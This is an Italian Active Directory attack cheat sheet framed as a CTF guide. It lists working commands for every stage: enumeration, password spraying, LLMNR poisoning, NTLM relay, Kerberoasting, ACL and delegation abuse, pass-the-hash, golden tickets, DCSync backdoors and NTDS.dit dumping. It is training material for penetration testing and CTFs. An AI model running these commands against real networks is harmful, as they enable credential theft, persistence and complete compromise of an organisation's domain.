# 🏢 Metodologia di Attacco Active Directory

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Guida Step-by-Step da Utente a Amministratore di Dominio
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guida-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Panoramica del Percorso di Attacco


```

┌─────────────────────────────────────────────────────────────────────────┐
│                    METODOLOGIA DI ATTACCO AD                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   FASE 1: Enumeration     FASE 2: Initial Access    FASE 3: PrivEsc │
│   ├── Network Scan         ├── Password Spray         ├── Kerberoast   │
│   ├── LDAP Enum            ├── LLMNR Poison           ├── AS-REP       │
│   ├── User Enum            └── NTLM Relay             └── ACL Abuse    │
│   └── BloodHound                                                        │
│                                                                         │
│   FASE 4: Lateral Move    FASE 5: Persistence      FASE 6: Dominio   │
│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key          └── Full Pwn!     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Tabella dei Contenuti

1. [Fase 1: Enumeration](#-fase-1-enumeration)
2. [Fase 2: Initial Access](#-fase-2-initial-access)
3. [Fase 3: Privilege Escalation](#-fase-3-privilege-escalation)
4. [Fase 4: Lateral Movement](#-fase-4-lateral-movement)
5. [Fase 5: Persistence](#-fase-5-persistence)
6. [Fase 6: Dominio (Domain Dominance)](#-fase-6-dominio-domain-dominance)
7. [Riferimento Rapido Comandi](#-riferimento-rapido-comandi)

---

## 🔍 Fase 1: Enumeration

### 1.1 Discovery di Rete

```bash
# Trova i Domain Controller
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identifica i servizi AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Porte Chiave:**
| Porta | Servizio | Scopo |
|------|---------|---------|
| 53 | DNS | Risoluzione dominio |
| 88 | Kerberos | Autenticazione |
| 389 | LDAP | Directory |
| 445 | SMB | Condivisioni file |
| 636 | LDAPS | LDAP Sicuro |
| 5985 | WinRM | Gestione remota |

### 1.2 Enumeration Anonima (Senza Credenziali)

```bash
# Sessione nulla RPC
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Bind anonimo LDAP
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Enum utenti Kerbrute (senza credenziali!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Con Credenziali Valide

```bash
# Ottieni info sul dominio
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Enumeration LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Enumeration PowerView

```powershell
# Importa PowerView
Import-Module .\PowerView.ps1

# Info dominio
Get-Domain
Get-DomainController

# Trova target interessanti
Get-DomainUser -SPN                             # Kerberoastable
Get-DomainUser -PreauthNotRequired               # AS-REP roastable
Get-DomainComputer -Unconstrained                # Delegation

# Trova sessioni Domain Admin (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Raccolta BloodHound

```bash
# Da Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Da Windows (SharpHound)
.\SharpHound.exe -c All
```

**Query BloodHound:**

```cypher
# Percorso più breve per DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Utenti Kerberoastable
MATCH (u:User {hasspn:true}) RETURN u.name

# Utenti con diritti DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Fase 2: Initial Access

### 2.1 Password Spraying

```bash
# Spray con CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Spray con Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Password Comuni:**

```
Stagione+Anno: Estate2024!, Inverno2024
NomeAzienda+123: Azienda123!
Benvenuto1, Password1
```

### 2.2 Avvelenamento LLMNR/NBT-NS (Poisoning)

```bash
# Terminale 1: Avvia Responder
sudo responder -I eth0 -wPv

# Attendi gli hash...
# NTLMv2 catturato!

# Terminale 2: Crack dell'hash
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM Relay

```bash
# Trova target senza firma SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB spento)
sudo responder -I eth0

# Attacco Relay
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (Nessuna password richiesta!)

```bash
# Trova utenti vulnerabili
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Oppure con credenziali
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## ⬆️ Fase 3: Privilege Escalation

### 3.1 Kerberoasting

```bash
# Da Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Da Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Abuso ACL

**GenericAll su Utente:**

```powershell
# Cambia password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll su Gruppo:**

```powershell
# Aggiungi te stesso al gruppo
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**

```powershell
# Imposta SPN per Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**

```powershell
# Assegna a te stesso i diritti DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Attacchi di Delegation

**Unconstrained Delegation:**

```powershell
# Trova i target
Get-DomainComputer -Unconstrained

# Monitora i TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Trigger (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Constrained Delegation:**

```bash
# Richiedi il ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Usa il ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Resource-Based Constrained Delegation (RBCD):**

```bash
# Crea l'account della macchina
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Imposta RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Ottieni ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

## ➡️ Fase 4: Lateral Movement

### 4.1 Pass-the-Hash

```bash
# PSExec con hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Esporta ticket
.\Rubeus.exe dump

# Usa ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Usa ticket (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM con password
evil-winrm -i 10.10.10.10 -u admin -p password

# Con hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Ottieni TGT con hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Ora usa Kerberos
dir \\server\share
```

---

## 🔒 Fase 5: Persistence

### 5.1 Golden Ticket

```bash
# Necessari: hash NTLM krbtgt + SID Dominio

# Crea ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Utilizzo
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Crea ticket di servizio
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 Backdoor DCSync

```powershell
# Aggiungi diritti DCSync a qualsiasi utente
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Fase 6: Dominio (Domain Dominance)

### 6.1 DCSync

```bash
# Dump di tutti gli hash
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Con hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Utente specifico
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Estrazione NTDS.dit

```bash
# Crea copia del file shadow
vssadmin create shadow /for=C:

# Copia NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Estrazione offline
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Dump con CrackMapExec

```bash
# Dump NTDS via DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Riferimento Rapido Comandi

### One-Liner per Enumeration

```bash
# Trova i DC
nmap -p 88,389 --open 10.10.10.0/24

# Enum utenti (senza credenziali)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Trova utenti vulnerabili ad AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Cheatsheet di Attacco

| Attacco | Comando |
| --- | --- |
| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Cracking degli Hash

| Tipo di Hash | Modalità Hashcat |
| --- | --- |
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 Consigli per CTF

1. **Enumera sempre prima** - Non attaccare alla cieca.
2. **Controlla AS-REP** - Hash gratuiti senza credenziali!
3. **Esegui BloodHound** - Trova i percorsi di attacco.
4. **Controlla le ACL** - Spesso configurate male.
5. **Cerca deleghe (delegation)** - Vittorie facili.
6. **Fai lo spray con attenzione** - Attento al blocco degli account!
7. **Salva tutte le credenziali** - Ti serviranno più avanti.

---

## 📚 Cheatsheets Correlate

- [BloodHound](../BloodHound/translations/README.it.md)
- [Impacket](../Impacket/translations/README.it.md)
- [CrackMapExec](../CrackMapExec/translations/README.it.md)
- [Rubeus](../Rubeus/translations/README.it.md)
- [PowerView](../PowerView/translations/README.it.md)
- [Responder](../Responder/translations/README.it.md)
- [Evil-WinRM](../Evil-WinRM/translations/README.it.md)
- [Mimikatz](../Mimikatz/translations/README.it.md)

---

<p align="center">
  <b>🏢 Da Utente a Domain Admin!</b>
  <i>Segui la metodologia, conquista il dominio</i>
</p>
